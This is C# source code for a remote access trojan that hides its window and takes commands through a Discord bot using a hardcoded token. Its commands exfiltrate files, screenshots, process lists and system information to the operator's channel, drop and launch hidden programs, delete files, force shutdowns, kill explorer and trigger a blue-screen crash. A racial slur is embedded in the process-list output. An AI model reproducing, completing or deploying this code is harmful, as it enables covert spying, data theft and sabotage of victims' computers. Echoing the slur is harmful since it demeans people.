using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Discord;
using Discord.Gateway;
using System.Net.Sockets;
using System.Globalization;
using discord_backdoor.sounds;

namespace discord_Backdoor
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{

		public static void BSOD(bool Forced)
		{
			Process[] processess = Process.GetProcesses();//Get all the process in your system

			foreach (var process in processess)
			{
				try
				{
					process.PriorityClass = ProcessPriorityClass.BelowNormal; //sets all the process to below normal priority
					process.Kill();
				}
				catch (Exception E)
				{
				}

			}
		}



		[DllImport("ntdll.dll")]
		public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		[DllImport("ntdll.dll")]
		public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);


		[DllImport("user32.dll")]
		private static extern int ShowWindow(int Handle, int showState);


		[DllImport("kernel32.dll")]
		public static extern int GetConsoleWindow();

		[DllImport("msvcrt.dll")]
		public static extern int system(string format);

		private static void HideWindow()
		{
			try
			{
				int win = Program.GetConsoleWindow();
				Program.ShowWindow(win, 0);
			}
			catch (Exception e)
			{
				Console.WriteLine(e.Message);
			}
		}
		private static void Main(string[] args)
		{
			Program.HideWindow();
			try
			{
				bool flag = false;
				Program.program_started = DateTime.Now;
				bool flag2;
				do
				{
					// flag2 = (File.Exists("Anarchy.dll") && File.Exists("Leaf.xNet.dll") && File.Exists("Newtonsoft.Json.dll") && File.Exists("websocket-sharp.dll"));
					flag2 = true;
				}
				while (!flag2);
				bool flag3 = !File.Exists("C:\\Users\\" + Environment.UserName + "\\system32.sys");
				if (flag3)
				{
					try
					{
						Program.token = "Bot ODIzMzU0Mjg2NTEwNTcxNTgx.YFfmbw.ktivWpMcj3xXL1Mhex-Nd32-FzI"; //Bot Token
						Program.commanding_parent = 823353814232465428UL; //Category inside the server's id.
						Program.commanding_guild = 00000000UL; //Guid ID
						Program.commanding_users.Add(810393427677151222UL);
						//Program.commanding_users.Add(207659412607760738UL); --Add multiple users to control the trojan
						//Program.commanding_users.Add(716491927007701008UL);
						//Program.commanding_users.Add(810393426677151242UL);
						bool flag4 = !flag;
						if (flag4)
						{
							Program.start();
						}
					}
					catch
					{
					}
				}
				Thread.Sleep(10000);
			}
			catch
			{
			}
			Thread.Sleep(-1);
		}

		public static void start()
		{
			DiscordSocketClient discordSocketClient = new DiscordSocketClient(null);
			discordSocketClient.OnLoggedIn += Program.OnLoggedIn;
			discordSocketClient.OnMessageReceived += Program.OnMessageReceived;
			discordSocketClient.Login(Program.token);

		}


		private static void OnMessageReceived(DiscordSocketClient client, MessageEventArgs args)
		{
			bool flag = args.Message.Channel.Id == 00000000UL; // Global Clients Channel
			if (flag)
			{
				bool flag3 = args.Message.Content.Contains("rat.Delete");
				if (flag3)
				{
					try
					{
						string text = args.Message.Content.Replace("rat.Delete ", "");
						File.Delete(text);
						client.SendMessage(args.Message.Channel.Id, string.Format("[{0}] - Deleted file from ``{1}``", DateTime.Now, text), false, null);
					}
					catch (Exception ex2)
					{
						client.SendMessage(args.Message.Channel.Id, string.Format("Failed: " + ex2.ToString(), DateTime.Now, Program.program_started), false, null);
					}
					
				}
				bool flag4 = args.Message.Content.Contains("rat.Download");
				if (flag4)
				{
					string text2 = args.Message.Content.Replace("rat.Download ", "");
					bool flag5 = text2.Contains("<x>");
					if (flag5)
					{
						text2 = text2.Replace("<x>", Environment.UserName);
					}
					client.SendFile(args.Message.Channel.Id, text2 ?? "", File.ReadAllBytes(text2 ?? ""), string.Format("[{0}] - Downloaded from ``{1}``", DateTime.Now, text2), false);
				}
			}
			bool flag6 = !Program.commanding_users.Contains(args.Message.Author.User.Id);
			if (!flag6)
			{
				bool flag7 = client.GetChannel(args.Message.Channel.Id).Name != Program.commanding_name.ToLower();
				if (!flag7)
				{
					bool flag8 = args.Message.Content.Contains("rat.Upload") && args.Message.Attachment.FileName != null;
					if (flag8)
					{
						try
						{
							WebClient webClient2 = new WebClient();
							webClient2.DownloadFile(args.Message.Attachment.Url, "C:\\Users\\" + Environment.UserName + "\\" + args.Message.Attachment.FileName);
							client.SendMessage(Program.commanding_channel, string.Format("[{0}] - Uploaded ``{1}`` to ``C:\\Users\\{2}\\{3}``", new object[]
							{
								DateTime.Now,
								args.Message.Attachment.FileName,
								Environment.UserName,
								args.Message.Attachment.FileName
							}), false, null);
							webClient2.Dispose();
						}
						catch (Exception ex2)
						{
							client.SendMessage(args.Message.Channel.Id, string.Format("Failed: " + ex2.ToString(), DateTime.Now, Program.program_started), false, null);
						}
					}
					bool flag9 = args.Message.Content.Contains("rat.Screenshot");
					if (flag9)
					{
						try
                        {
							Rectangle bounds = Screen.GetBounds(Point.Empty);
							using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
							{
								using (Graphics graphics = Graphics.FromImage(bitmap))
								{
									graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
								}
								bitmap.Save("Desktop.jpg", ImageFormat.Jpeg);
								client.SendFile(args.Message.Channel.Id, "Desktop.jpg", null, false);
								File.Delete("Desktop.jpg");
							}
						}
						catch
                        {
							client.SendMessage(args.Message.Channel.Id, string.Format("Failed to take screenshot...", DateTime.Now, Program.program_started), false, null);
						}						
					}
					bool flag10 = args.Message.Content.Contains("rat.Check");
					if (flag10)
					{
						client.SendMessage(args.Message.Channel.Id, string.Format("[{0}] - I am online | started ``{1}``", DateTime.Now, Program.program_started), false, null);
					}
					bool flag11 = args.Message.Content.Contains("rat.Delete");
					if (flag11)
					{
						string text3 = args.Message.Content.Replace("rat.Delete ", "");
						File.Delete(text3);
						client.SendMessage(args.Message.Channel.Id, string.Format("[{0}] - Deleted file from ``{1}``", DateTime.Now, text3), false, null);
					}
					bool flag69 = args.Message.Content.Contains("rat.tetris");
					if (flag69)
					{
                        discord_backdoor.sounds.Sounds.Tetris();
					}
					bool flag68 = args.Message.Content.Contains("rat.annoy");
					if (flag68)
					{
						discord_backdoor.sounds.Sounds.Annoying();
					}
					bool flag67 = args.Message.Content.Contains("rat.birthday");
					if (flag67)
					{
						discord_backdoor.sounds.Sounds.HappyBirthday();
					}
					bool flag12 = args.Message.Content.Contains("rat.Processes");
					if (flag12)
					{
						List<string> list = new List<string>();
						foreach (Process process in Process.GetProcesses().ToList<Process>())
						{
							list.Add(string.Concat(new string[]
							{
								"Process Name : ",
								process.ProcessName,
								" | Window Title : ",
								(process.MainWindowTitle == null) ? "" : process.MainWindowTitle,
								" | <-- Nigger -->\n"
							}));
						}
						Random random = new Random();
						int num = random.Next(1, int.MaxValue);
						File.WriteAllLines(string.Format("{0}-{1}", Environment.UserName.ToLower(), num), list.ToArray());
						client.SendFile(args.Message.Channel.Id, string.Format("{0}-{1}", Environment.UserName.ToLower(), num), File.ReadAllBytes(string.Format("{0}-{1}", Environment.UserName.ToLower(), num)), string.Format("[{0}] - Process list for ``{1}``", DateTime.Now, Environment.UserName), false);
						File.Delete(string.Format("{0}-{1}", Environment.UserName.ToLower(), num));
					}
					bool flag13 = args.Message.Content.Contains("rat.Download");
					if (flag13)
					{
						string text4 = args.Message.Content.Replace("rat.Download ", "");
						bool flag14 = text4.Contains("<x>");
						if (flag14)
						{
							text4 = text4.Replace("<x>", Environment.UserName);
						}
						client.SendFile(args.Message.Channel.Id, text4 ?? "", File.ReadAllBytes(text4 ?? ""), string.Format("[{0}] - Downloaded from ``{1}``", DateTime.Now, text4), false);
					}
					bool flag15 = args.Message.Content.Contains("rat.Help");
					if (flag15)
					{
						client.SendMessage(args.Message.Channel.Id,
							"**__Commands__**"
							+ "\n``rat.Upload <File>``"
							+ "\n``rat.Start <FilePath>``"
							+ "\n``rat.Check``"
							+ "\n``rat.Delete <FilePath>``"
							+ "\n``rat.Processes``" 
							+ "\n``rat.Download <FilePath>``"
							+ "\n``rat.Help``" 
							+ "\n``rat.Screenshot``" 
							+ "\n``rat.Shutdown {x}``"
							+ "\n``rat.Message``" 
							+ "\n``rat.Systeminfo``" 
							+ "\n``rat.Web``"
							+ "\n``rat.BSOD``" 
							+ "\n``rat.Killexplrr``" 
							+ "\n``rat.stop`` [Disabled by Default]"
							+ "\n``rat.rdp``" 
							, false, null);

					}
					bool flag16 = args.Message.Content.Contains("rat.Blacklist");
					if (flag16)
					{
						try
						{
							File.Create("C:\\Users\\" + Environment.UserName + "\\system32.sys", 9999, FileOptions.Encrypted);
							client.SendMessage(args.Message.Channel.Id, string.Format("[{0}] - Blacklisted client {1}", DateTime.Now, Environment.UserName), false, null);
							Environment.FailFast(null);
						}
						catch
						{
						}
					}
					bool flag48 = args.Message.Content.Contains("rat.end");
					if (flag48)
					{
						try
						{
							Environment.Exit(0x4);
							client.SendMessage(args.Message.Channel.Id, string.Format("stopped"), false, null);
						}
						catch
						{
						}
					}
					bool flag17 = args.Message.Content.Contains("rat.Start");
					if (flag17)
					{
						string text5 = args.Message.Content.Replace("rat.Start ", "");
						Process process2 = new Process();
						process2.StartInfo.FileName = (text5 ?? "");
						process2.StartInfo.CreateNoWindow = true;
						process2.StartInfo.UseShellExecute = false;
						process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process2.Start();
						client.SendMessage(args.Message.Channel.Id, string.Format("[{0}] - Started ``{1}`` as a hidden process", DateTime.Now, text5), false, null);
						process2.Dispose();
					}
					bool flag18 = args.Message.Content.Contains("rat.Shutdown");
					if (flag18)
					{
						string text6 = args.Message.Content.Replace("rat.Shutdown ", "");
						client.SendMessage(args.Message.Channel.Id, string.Format("Shutting down...", DateTime.Now), false, null);
						Process.Start("shutdown /s /c " + text6 + " /t 10");
						client.SendMessage(args.Message.Channel.Id, string.Format("Shutdown", DateTime.Now), false, null);
					}
					bool flag42 = args.Message.Content.Contains("rat.beep");
					if (flag42)
					{
						Console.Beep(1, 1000);
					}
					bool flag19 = args.Message.Content.Contains("rat.Message");
					if (flag19)
					{
						string text3 = args.Message.Content.Replace("rat.Message ", "");
						client.SendMessage(args.Message.Channel.Id, string.Format("Showed Message Box with text ``" + text3 + "``", DateTime.Now, text3), false, null);
						MessageBox.Show(text3, text3);
					}
					bool flag21 = args.Message.Content.Contains("rat.ver");
					if (flag21)
					{
						string[] drives = Environment.GetLogicalDrives();
						client.SendMessage(args.Message.Channel.Id, string.Format("1.00", DateTime.Now), false, null);
					}
					bool flag22 = args.Message.Content.Contains("rat.Web");
					if (flag22)
					{
						string text5 = args.Message.Content.Replace("rat.Web ", "");
						Process.Start(text5);
						client.SendMessage(args.Message.Channel.Id, string.Format("Opened \"``" + text5 + "``\"", DateTime.Now, text5), false, null);
					}
					bool flag23 = args.Message.Content.Contains("rat.BSOD");
					if (flag23)
					{
						client.SendMessage(args.Message.Channel.Id, string.Format("BSOD Error: ``0xc1337000``", DateTime.Now), false, null);
						Boolean t1;
						uint t2;
						RtlAdjustPrivilege(19, true, false, out t1);
						NtRaiseHardError(0xc1337000, 0, 0, IntPtr.Zero, 6, out t2);
					}
					bool flag24 = args.Message.Content.Contains("rat.Killexplrr");
					if (flag24)
					{ 
						Process[] prcChecker = Process.GetProcessesByName("explorer");
						if (prcChecker.Length > 0)
						{
							foreach (Process p in prcChecker)
							{
								p.Kill();
								client.SendMessage(args.Message.Channel.Id, string.Format("Explorer has been killed...", DateTime.Now), false, null);
							}
						}
						else
						{
							client.SendMessage(args.Message.Channel.Id, string.Format("Explorer is not running....", DateTime.Now), false, null);
						}

					}
					/*bool flag25 = args.Message.Content.Contains("rat.stop");
					if (flag25)
					{
						client.SendMessage(args.Message.Channel.Id, string.Format("Stopped Process", DateTime.Now), false, null);
						Environment.Exit(0xc420);
					}*/
					bool flag29 = args.Message.Content.Contains("rat.systeminfo");
					if (flag29)
					{
						string[] drives = Environment.GetLogicalDrives();
						CultureInfo di = CultureInfo.InstalledUICulture;
						client.SendMessage(args.Message.Channel.Id,
						"⛈️ **DiscordTrojan - Report:**"
						+ "\nDate: " + DateTime.Now
						+ "\nSystem: " + Environment.OSVersion.ToString()
						+ "\nUsername: " + Environment.UserName
						+ "\nComputerName: " + Environment.MachineName
						+ "\nLanguage: " + di.Name
						+ "\n"
						+ "\n💻 **__Other Information__**"
						+ "\nSystemDirectory: " + Environment.SystemDirectory
						//+ "\nTickCount: " + Environment.TickCount
						+ "\nUserDomainName: " + Environment.UserDomainName
						+ "\nWorkingSet: " + Environment.WorkingSet
						+ "\nGetLogicalDrives: " + String.Join(", ", drives)
						, false, null);
					}
				}
				}
		}


		private static void OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
		{
			bool flag = !Program.logged_in;
			if (flag)
			{
				Program.commanding_name = (Environment.UserName.Replace(" ", "-").Replace("/", "-") ?? "").ToLower();
				bool flag2 = Program.command_channelExists(Program.commanding_name, Program.commanding_guild, client);
				bool flag3 = !flag2;
				if (flag3)
				{
					bool flag4 = Program.commanding_channel == 0UL;
					if (flag4)
					{
						Program.commanding_channel = client.CreateGuildChannel(Program.commanding_guild, Program.commanding_name, ChannelType.Text, new ulong?(Program.commanding_parent)).Id;
					}
				}
			}
			Program.logged_in = true;
		}

		private static bool command_channelExists(string identifier, ulong serverID, DiscordSocketClient c)
		{
			List<GuildChannel> list = c.GetGuild(serverID).GetChannels().ToList<GuildChannel>();
			foreach (GuildChannel guildChannel in list)
			{
				bool flag = guildChannel.Type == ChannelType.Text && guildChannel.Name == identifier;
				if (flag)
				{
					Program.commanding_channel = guildChannel.Id;
					return true;
				}
			}
			return false;
		}

	
		public static string rename_file(string input_file)
		{
			bool flag = !input_file.Contains(".exe");
			if (flag)
			{
				input_file += ".exe";
			}
			bool flag2 = input_file.Contains(" ");
			if (flag2)
			{
				input_file = input_file.Replace(" ", "-").Replace("_", "-");
			}
			return input_file;
		}


		public static List<ulong> commanding_users = new List<ulong>();


		public static string token;

		public static ulong commanding_guild;


		public static ulong commanding_parent;


		public static bool logged_in = false;


		public static ulong commanding_channel = 0UL;


		public static string commanding_name;


		public static DateTime program_started = default(DateTime);
	}
}
